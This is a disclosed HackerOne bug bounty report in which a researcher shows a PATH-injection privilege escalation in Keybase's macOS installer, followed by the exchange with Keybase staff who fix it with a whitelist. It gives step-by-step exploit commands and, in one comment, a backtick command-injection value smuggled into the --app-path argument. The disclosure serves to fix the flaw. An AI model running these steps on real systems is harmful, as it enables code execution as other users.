{"id":490960,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80OTA5NjA=","url":"https://hackerone.com/reports/490960","title":"macOS privilege escalation","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2019-02-04T11:54:03.909Z","submitted_at":"2019-02-04T11:54:03.909Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"u3mur4","url":"/u3mur4","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/449/470/1f5148d87050c9c48970956ff5160260dcd451c2_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2809,"url":"https://hackerone.com/keybase","handle":"keybase","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Keybase","twitter_handle":"keybaseio","website":"https://keybase.io","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-01-24T23:20:42.560Z","bug_reporter_agreed_on_going_public_at":"2020-01-23T07:13:03.506Z","team_member_agreed_on_going_public_at":"2020-01-24T23:20:42.496Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# Short description\n\nWe can add an arbitrary folder to the default `$PATH` environment variable, so we can exploit this to run arbitrary code as the targeted user.\n\n# Steps to reproduce\n\n1. In the example I will use the low privileged `nobody` account (could be any other account) and I will target the `u3mur4` admin user.\n```\n➜ ~ sudo -u nobody bash\nPassword:\nbash-3.2$ id\nuid=4294967294(nobody) gid=4294967294(nobody) groups=4294967294(nobody),12(everyone),61(localaccounts),702(2),701(1),100(_lpoperator)\n```\n\n2. Make sure the `/usr/local/bin` directory not exist.\n```\nsudo mv /usr/local/bin /usr/local/bin2\n```\n\u003e By default this directory not exist.\n\n3. Remove the `/etc/paths.d/Keybase` file using keybase installer with the `--uninstall-cli` flag.\n```\nbash-3.2$ cat /etc/paths.d/Keybase\n/Applications/Keybase.app/Contents/SharedSupport/bin\nbash-3.2$ /Applications/Keybase.app/Contents/Resources/KeybaseInstaller.app/Contents/MacOS/Keybase --run-mode=prod --timeout=10 --debug --app-path='/Applications/Keybase.app' --uninstall-cli\n[REMOVED]\n02.04.2019 02:30:24.274 Installer:109[INFO] Uninstalled\nbash-3.2$ cat /etc/paths.d/Keybase\ncat: /etc/paths.d/Keybase: No such file or directory\n```\n\u003e When the `/usr/local/bin` directory not exist the installer will create the `/etc/paths.d/Keybase` file.\n\n4.  Create the `/var/tmp/poc/Contents/SharedSupport/bin` folder structure and create an executable file named as `keybase`.\n```bash\nbash-3.2$ mkdir -p /var/tmp/poc/Contents/SharedSupport/bin\nbash-3.2$ cd /var/tmp/poc/Contents/SharedSupport/bin\nbash-3.2$ cat \u003c\u003cEOF \u003e\u003e keybase\n#! /bin/bash\necho test\nEOF\nbash-3.2$ chmod +x keybase\n```\n\n5. Run the keybase installer command with `--app-path=/Applications/Keybase.app/:/var/tmp/poc` and the `--install-cli` flag.\n```\nbash-3.2$ /Applications/Keybase.app/Contents/Resources/KeybaseInstaller.app/Contents/MacOS/Keybase --run-mode=prod --timeout=10 --debug --app-path='/Applications/Keybase.app/:/var/tmp/poc' --install-cli\n[REMOVED]\n02.04.2019 02:34:38.720 KBInstaller:32[DEBG] Install: CLI\n02.04.2019 02:34:38.720 KBCommandLine:38[DEBG] Helper: addToPath({\n    appName = Keybase;\n    directory = \"/Applications/Keybase.app/:/var/tmp/poc/Contents/SharedSupport/bin\";\n    name = keybase;\n})\n02.04.2019 02:34:38.723 KBCommandLine:40[DEBG] Result: {\n    path = \"/etc/paths.d/Keybase\";\n}\n02.04.2019 02:34:38.723 KBCommandLine:47[DEBG] Helper: addToPath({\n    appName = Keybase;\n    directory = \"/Applications/Keybase.app/:/var/tmp/poc/Contents/SharedSupport/bin\";\n    name = \"git-remote-keybase\";\n})\n[REMOVED]\nbash-3.2$ cat /etc/paths.d/Keybase\n/Applications/Keybase.app/:/var/tmp/poc/Contents/SharedSupport/bin\n```\n\n6. Wait until the targeted user opens a new terminal. The new terminal will load the paths from `/etc/paths.d`.\n```\n➜  ~ id\nuid=501(u3mur4) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),702(2),701(1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)\n➜  ~ which keybase\n/var/tmp/poc/Contents/SharedSupport/bin/keybase\n➜  ~ /usr/libexec/path_helper\nPATH=\"/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/Applications/Keybase.app/:/var/tmp/poc/Contents/SharedSupport/bin\"; export PATH;\n➜  ~ keybase\ntest\n```\n\n# Why this works? \nThe `checkIfPathIsFishy` doesn't checks that the path contains the `\":\"` character. \n\n```objective-c\n(BOOL)checkIfPathIsFishy:(NSString *)path { \n NSArray *v = [path componentsSeparatedByString:@\"/\"]; \n for (int i = 0; i \u003c v.count; i++) { \n if ([v[i] isEqualToString:@\"..\"]) { \n return YES; \n } \n if ([v[i] isEqualToString:@\".\"]) { \n return YES; \n } \n } \n \n // Do not allow ~ or $ characters in the path. \n if ([path rangeOfString:@\"$\"].location != NSNotFound) { \n return YES; \n } \n if ([path rangeOfString:@\"~\"].location != NSNotFound) { \n return YES; \n } \n return NO; \n} \n```\n\nThe `addToPath` writes the path (`/Applications/Keybase.app/:/var/tmp/poc/Contents/SharedSupport/bin`) to the `/etc/paths.d/Keybase` file. The `:` will be interpreted as a search path separator and it will be added to the `$PATH` environment variable.\n```\n  // If we don't have a /usr/local/bin then fall back to /etc/paths.d.\n  // Terminal will load /etc/profile, which uses /usr/libexec/path_helper which loads paths from /etc/paths.d.\n  // Some users will override the default usage of /etc/profile in Terminal though so this isn't guaranteed to\n  // include keybase in the path on those systems, however, these two cases should handle most of our users.\n\n  NSString *pathsd = @\"/etc/paths.d\";\n\n  // On fresh Sierra install, /etc/paths.d doesn't exist\n  if (![NSFileManager.defaultManager fileExistsAtPath:pathsd]) {\n    NSError *error = nil;\n    if (![NSFileManager.defaultManager createDirectoryAtPath:pathsd withIntermediateDirectories:NO attributes:nil error:\u0026error]) {\n      completion(error, nil);\n      return;\n    }\n  }\n\n  NSString *pathsdPath = [NSString stringWithFormat:@\"%@/%@\", pathsd, appName];\n  if ([NSFileManager.defaultManager fileExistsAtPath:pathsdPath]) {\n    completion(nil, nil);\n    return;\n  }\n  NSError *error = nil;\n  [directory writeToFile:pathsdPath atomically:YES encoding:NSUTF8StringEncoding error:\u0026error];\n  completion(error, @{@\"path\": pathsdPath});\n}\n```\n\n## Impact\n\nAccess other users personal files and execute commands as the user. If the user is root we could  immediately gain root privileges .","vulnerability_information_html":"\u003ch1 id=\"short-description\"\u003eShort description\u003c/h1\u003e\n\n\u003cp\u003eWe can add an arbitrary folder to the default \u003ccode\u003e$PATH\u003c/code\u003e environment variable, so we can exploit this to run arbitrary code as the targeted user.\u003c/p\u003e\n\n\u003ch1 id=\"steps-to-reproduce\"\u003eSteps to reproduce\u003c/h1\u003e\n\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eIn the example I will use the low privileged \u003ccode\u003enobody\u003c/code\u003e account (could be any other account) and I will target the \u003ccode\u003eu3mur4\u003c/code\u003e admin user.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e➜ ~ sudo -u nobody bash\nPassword:\nbash-3.2$ id\nuid=4294967294(nobody) gid=4294967294(nobody) groups=4294967294(nobody),12(everyone),61(localaccounts),702(2),701(1),100(_lpoperator)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eMake sure the \u003ccode\u003e/usr/local/bin\u003c/code\u003e directory not exist.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003esudo mv /usr/local/bin /usr/local/bin2\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp\u003eBy default this directory not exist.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eRemove the \u003ccode\u003e/etc/paths.d/Keybase\u003c/code\u003e file using keybase installer with the \u003ccode\u003e--uninstall-cli\u003c/code\u003e flag.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ebash-3.2$ cat /etc/paths.d/Keybase\n/Applications/Keybase.app/Contents/SharedSupport/bin\nbash-3.2$ /Applications/Keybase.app/Contents/Resources/KeybaseInstaller.app/Contents/MacOS/Keybase --run-mode=prod --timeout=10 --debug --app-path=\u0026#39;/Applications/Keybase.app\u0026#39; --uninstall-cli\n[REMOVED]\n02.04.2019 02:30:24.274 Installer:109[INFO] Uninstalled\nbash-3.2$ cat /etc/paths.d/Keybase\ncat: /etc/paths.d/Keybase: No such file or directory\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWhen the \u003ccode\u003e/usr/local/bin\u003c/code\u003e directory not exist the installer will create the \u003ccode\u003e/etc/paths.d/Keybase\u003c/code\u003e file.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eCreate the \u003ccode\u003e/var/tmp/poc/Contents/SharedSupport/bin\u003c/code\u003e folder structure and create an executable file named as \u003ccode\u003ekeybase\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003ebash-3.2\u003cspan class=\"nv\"\u003e$ \u003c/span\u003e\u003cspan class=\"nb\"\u003emkdir\u003c/span\u003e \u003cspan class=\"nt\"\u003e-p\u003c/span\u003e /var/tmp/poc/Contents/SharedSupport/bin\nbash-3.2\u003cspan class=\"nv\"\u003e$ \u003c/span\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /var/tmp/poc/Contents/SharedSupport/bin\nbash-3.2\u003cspan class=\"nv\"\u003e$ \u003c/span\u003e\u003cspan class=\"nb\"\u003ecat\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e\u003cspan class=\"no\"\u003eEOF\u003c/span\u003e\u003cspan class=\"sh\"\u003e \u0026gt;\u0026gt; keybase\n#! /bin/bash\necho test\n\u003c/span\u003e\u003cspan class=\"no\"\u003eEOF\n\u003c/span\u003ebash-3.2\u003cspan class=\"nv\"\u003e$ \u003c/span\u003e\u003cspan class=\"nb\"\u003echmod\u003c/span\u003e +x keybase\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eRun the keybase installer command with \u003ccode\u003e--app-path=/Applications/Keybase.app/:/var/tmp/poc\u003c/code\u003e and the \u003ccode\u003e--install-cli\u003c/code\u003e flag.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ebash-3.2$ /Applications/Keybase.app/Contents/Resources/KeybaseInstaller.app/Contents/MacOS/Keybase --run-mode=prod --timeout=10 --debug --app-path=\u0026#39;/Applications/Keybase.app/:/var/tmp/poc\u0026#39; --install-cli\n[REMOVED]\n02.04.2019 02:34:38.720 KBInstaller:32[DEBG] Install: CLI\n02.04.2019 02:34:38.720 KBCommandLine:38[DEBG] Helper: addToPath({\nappName = Keybase;\ndirectory = \u0026quot;/Applications/Keybase.app/:/var/tmp/poc/Contents/SharedSupport/bin\u0026quot;;\nname = keybase;\n})\n02.04.2019 02:34:38.723 KBCommandLine:40[DEBG] Result: {\npath = \u0026quot;/etc/paths.d/Keybase\u0026quot;;\n}\n02.04.2019 02:34:38.723 KBCommandLine:47[DEBG] Helper: addToPath({\nappName = Keybase;\ndirectory = \u0026quot;/Applications/Keybase.app/:/var/tmp/poc/Contents/SharedSupport/bin\u0026quot;;\nname = \u0026quot;git-remote-keybase\u0026quot;;\n})\n[REMOVED]\nbash-3.2$ cat /etc/paths.d/Keybase\n/Applications/Keybase.app/:/var/tmp/poc/Contents/SharedSupport/bin\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eWait until the targeted user opens a new terminal. The new terminal will load the paths from \u003ccode\u003e/etc/paths.d\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e➜  ~ id\nuid=501(u3mur4) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),702(2),701(1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)\n➜  ~ which keybase\n/var/tmp/poc/Contents/SharedSupport/bin/keybase\n➜  ~ /usr/libexec/path_helper\nPATH=\u0026quot;/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/Applications/Keybase.app/:/var/tmp/poc/Contents/SharedSupport/bin\u0026quot;; export PATH;\n➜  ~ keybase\ntest\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch1 id=\"why-this-works\"\u003eWhy this works?\u003c/h1\u003e\n\n\u003cp\u003eThe \u003ccode\u003echeckIfPathIsFishy\u003c/code\u003e doesn\u0026#39;t checks that the path contains the \u003ccode\u003e\u0026quot;:\u0026quot;\u003c/code\u003e character. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e(BOOL)checkIfPathIsFishy:(NSString *)path { \n NSArray *v = [path componentsSeparatedByString:@\u0026quot;/\u0026quot;]; \n for (int i = 0; i \u0026lt; v.count; i++) { \n if ([v[i] isEqualToString:@\u0026quot;..\u0026quot;]) { \n return YES; \n } \n if ([v[i] isEqualToString:@\u0026quot;.\u0026quot;]) { \n return YES; \n } \n } \n\n // Do not allow ~ or $ characters in the path. \n if ([path rangeOfString:@\u0026quot;$\u0026quot;].location != NSNotFound) { \n return YES; \n } \n if ([path rangeOfString:@\u0026quot;~\u0026quot;].location != NSNotFound) { \n return YES; \n } \n return NO; \n} \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe \u003ccode\u003eaddToPath\u003c/code\u003e writes the path (\u003ccode\u003e/Applications/Keybase.app/:/var/tmp/poc/Contents/SharedSupport/bin\u003c/code\u003e) to the \u003ccode\u003e/etc/paths.d/Keybase\u003c/code\u003e file. The \u003ccode\u003e:\u003c/code\u003e will be interpreted as a search path separator and it will be added to the \u003ccode\u003e$PATH\u003c/code\u003e environment variable.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e  // If we don\u0026#39;t have a /usr/local/bin then fall back to /etc/paths.d.\n  // Terminal will load /etc/profile, which uses /usr/libexec/path_helper which loads paths from /etc/paths.d.\n  // Some users will override the default usage of /etc/profile in Terminal though so this isn\u0026#39;t guaranteed to\n  // include keybase in the path on those systems, however, these two cases should handle most of our users.\n\n  NSString *pathsd = @\u0026quot;/etc/paths.d\u0026quot;;\n\n  // On fresh Sierra install, /etc/paths.d doesn\u0026#39;t exist\n  if (![NSFileManager.defaultManager fileExistsAtPath:pathsd]) {\n    NSError *error = nil;\n    if (![NSFileManager.defaultManager createDirectoryAtPath:pathsd withIntermediateDirectories:NO attributes:nil error:\u0026amp;error]) {\n      completion(error, nil);\n      return;\n    }\n  }\n\n  NSString *pathsdPath = [NSString stringWithFormat:@\u0026quot;%@/%@\u0026quot;, pathsd, appName];\n  if ([NSFileManager.defaultManager fileExistsAtPath:pathsdPath]) {\n    completion(nil, nil);\n    return;\n  }\n  NSError *error = nil;\n  [directory writeToFile:pathsdPath atomically:YES encoding:NSUTF8StringEncoding error:\u0026amp;error];\n  completion(error, @{@\u0026quot;path\u0026quot;: pathsdPath});\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAccess other users personal files and execute commands as the user. If the user is root we could  immediately gain root privileges .\u003c/p\u003e\n","bounty_amount":"2000.0","formatted_bounty":"$2,000","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":44,"voters":["r4d1kal","superhero1","sourc7","u3mur4","metnew","mygf","icanthack","aryan2808","pikayrachu","imranhudaa","and 34 more..."],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4090254,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I noticed this bug while checking the patch for the previous report ( #485407 ). \nI wanted to share this as a comment in my previous report but I cannot load the report.\nAlso this is a different bug so I think it is worth as a new report but feel free to count as you want.","markdown_message":"\u003cp\u003eI noticed this bug while checking the patch for the previous report ( \u003ca href=\"/reports/485407\"\u003e#485407\u003c/a\u003e ). \u003cbr\u003e\nI wanted to share this as a comment in my previous report but I cannot load the report.\u003cbr\u003e\nAlso this is a different bug so I think it is worth as a new report but feel free to count as you want.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-04T11:54:26.697Z","updated_at":"2019-02-04T11:54:26.697Z","actor":{"username":"u3mur4","cleared":false,"url":"/u3mur4","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/449/470/1f5148d87050c9c48970956ff5160260dcd451c2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4090702,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I filed a complaint with H1 about that previous report. I seem to have broken it by posting the patch? Anyways, I agree this is an issue, thank you for pointing it out! I think the usual H1 practice here would be to affix this bug report to the previous report, since you're making the point that the previous fix was insufficient.","markdown_message":"\u003cp\u003eI filed a complaint with H1 about that previous report. I seem to have broken it by posting the patch? Anyways, I agree this is an issue, thank you for pointing it out! I think the usual H1 practice here would be to affix this bug report to the previous report, since you\u0026#39;re making the point that the previous fix was insufficient.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-04T13:47:58.681Z","updated_at":"2019-02-04T13:47:58.681Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4090816,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Perhaps I put it badly.\nThe fix was perfect. I couldn't reproduce the previously reported error. This error a completely different one but similar kind (PATH manipulation). In this report I don't use symbolic link or parent directory reference and I also target a different code path and I am using a different bug.\nDo you agree?","markdown_message":"\u003cp\u003ePerhaps I put it badly.\u003cbr\u003e\nThe fix was perfect. I couldn\u0026#39;t reproduce the previously reported error. This error a completely different one but similar kind (PATH manipulation). In this report I don\u0026#39;t use symbolic link or parent directory reference and I also target a different code path and I am using a different bug.\u003cbr\u003e\nDo you agree?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-04T14:07:04.627Z","updated_at":"2019-02-04T14:07:04.627Z","actor":{"username":"u3mur4","cleared":false,"url":"/u3mur4","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/449/470/1f5148d87050c9c48970956ff5160260dcd451c2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4090825,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-02-04T14:08:36.696Z","updated_at":"2019-02-04T14:08:36.696Z","additional_data":{"old_severity":"High (8.5)","new_severity":"Medium","old_severity_id":291851,"new_severity_id":291898},"actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4090833,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It doesn't really matter to us one way or the other. From our perspective it's the same issue -- improper input checks on paths. ","markdown_message":"\u003cp\u003eIt doesn\u0026#39;t really matter to us one way or the other. From our perspective it\u0026#39;s the same issue -- improper input checks on paths. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-04T14:09:37.191Z","updated_at":"2019-02-04T14:09:37.191Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4091197,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Okay!\n\nI further tested this error and found another way to run commands. I used the *backtick* character to run arbitrary command. \n```\n/Applications/Keybase.app/Contents/Resources/KeybaseInstaller.app/Contents/MacOS/Keybase --run-mode=prod --timeout=10 --debug --app-path='/Applications/Keybase.app/`id \u003e\u003e /tmp/test`' --install-cli\n```\n\u003e Don't forget to open a new terminal to trigger the command. Also I don't escape the backtick characters because we are inside single quote.","markdown_message":"\u003cp\u003eOkay!\u003c/p\u003e\n\n\u003cp\u003eI further tested this error and found another way to run commands. I used the \u003cem\u003ebacktick\u003c/em\u003e character to run arbitrary command. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e/Applications/Keybase.app/Contents/Resources/KeybaseInstaller.app/Contents/MacOS/Keybase --run-mode=prod --timeout=10 --debug --app-path=\u0026#39;/Applications/Keybase.app/`id \u0026gt;\u0026gt; /tmp/test`\u0026#39; --install-cli\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp\u003eDon\u0026#39;t forget to open a new terminal to trigger the command. Also I don\u0026#39;t escape the backtick characters because we are inside single quote.\u003c/p\u003e\n\u003c/blockquote\u003e\n","automated_response":false,"created_at":"2019-02-04T15:15:51.162Z","updated_at":"2019-02-04T15:15:51.162Z","actor":{"username":"u3mur4","cleared":false,"url":"/u3mur4","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/449/470/1f5148d87050c9c48970956ff5160260dcd451c2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4091543,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Good point. I'm going to switch it over to a whitelist. Thanks for your help!","markdown_message":"\u003cp\u003eGood point. I\u0026#39;m going to switch it over to a whitelist. Thanks for your help!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-04T17:09:36.761Z","updated_at":"2019-02-04T17:09:36.761Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4093735,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"OK, here's the whitelist version: https://prerelease.keybase.io/darwin-updates/Keybase-3.0.0-20190204185427%2B8289a84c6b.zip\n\n","markdown_message":"\u003cp\u003eOK, here\u0026#39;s the whitelist version: \u003ca title=\"https://prerelease.keybase.io/darwin-updates/Keybase-3.0.0-20190204185427%2B8289a84c6b.zip\" href=\"/redirect?url=https%3A%2F%2Fprerelease.keybase.io%2Fdarwin-updates%2FKeybase-3.0.0-20190204185427%252B8289a84c6b.zip\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://prerelease.keybase.io/darwin-updates/Keybase-3.0.0-20190204185427%2B8289a84c6b.zip\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-05T03:23:49.977Z","updated_at":"2019-02-05T03:23:49.977Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4096208,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I tested (black-box test) the new version and it looks fixed. The only thing I noticed that I can set the path to a non existing or a valid but empty path causing denial of service (`keybase` and `git-remote-keybase` binaries will not found in `PATH`). Also I can call keybase helper with the `--uninstall-cli` flag resulting the same effect.","markdown_message":"\u003cp\u003eI tested (black-box test) the new version and it looks fixed. The only thing I noticed that I can set the path to a non existing or a valid but empty path causing denial of service (\u003ccode\u003ekeybase\u003c/code\u003e and \u003ccode\u003egit-remote-keybase\u003c/code\u003e binaries will not found in \u003ccode\u003ePATH\u003c/code\u003e). Also I can call keybase helper with the \u003ccode\u003e--uninstall-cli\u003c/code\u003e flag resulting the same effect.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-05T13:14:01.584Z","updated_at":"2019-02-05T13:14:01.584Z","actor":{"username":"u3mur4","cleared":false,"url":"/u3mur4","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/449/470/1f5148d87050c9c48970956ff5160260dcd451c2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4097343,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Good point, but we're OK with that.  I'll try to show you the PR without breaking HackerOne. It should hit our mainline after we get releases out today.","markdown_message":"\u003cp\u003eGood point, but we\u0026#39;re OK with that.  I\u0026#39;ll try to show you the PR without breaking HackerOne. It should hit our mainline after we get releases out today.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-05T16:33:15.688Z","updated_at":"2019-02-05T16:33:15.688Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4100216,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here's the PR that we just merged and released today: https://github.com/keybase/client/pull/15898","markdown_message":"\u003cp\u003eHere\u0026#39;s the PR that we just merged and released today: \u003ca title=\"https://github.com/keybase/client/pull/15898\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fkeybase%2Fclient%2Fpull%2F15898\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/keybase/client/pull/15898\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-06T02:51:46.256Z","updated_at":"2019-02-06T02:51:46.256Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4100916,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Checked again and it's still looks OK!","markdown_message":"\u003cp\u003eChecked again and it\u0026#39;s still looks 